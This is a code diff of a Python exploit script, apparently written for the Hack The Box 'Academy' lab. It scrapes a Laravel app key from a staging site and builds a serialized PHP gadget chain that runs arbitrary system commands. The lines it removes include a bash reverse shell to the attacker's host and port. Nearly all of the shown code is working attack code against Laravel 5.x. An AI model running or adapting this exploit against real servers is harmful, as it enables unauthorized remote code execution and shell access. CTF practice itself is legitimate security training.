@@ -77,25 +77,18 @@ def MakeRequest():
             time.sleep(1)
             os.system(f"echo '{lhost} dev-staging-01.academy.htb' >> /etc/hosts")
 
-def generatePayload():
+def Exploit():
+
     # Extract API_KEY
     s = requests.get("http://dev-staging-01.academy.htb/")
     source_code = s.text
     pattern = r'base64:([\w/+]+=*)'
     api_key = re.search(pattern, source_code)[1]
 
-    # Generate payload
-    cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
-    payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
-    value = base64.b64encode(payload_decoded.encode()).decode('utf-8')
-    key = base64.b64decode(api_key)
-
-
-
-def Exploit():
     rich.print("[blue][+] Laravel 5.X version detected. [/blue]")
     rich.print("[yellow][+] Exploiting it... [/yellow]")
-    key = b'dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0='
+    
+    key = api_key
     comand = com
     payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(
         len(comand)) + ':"' + comand + '";}'
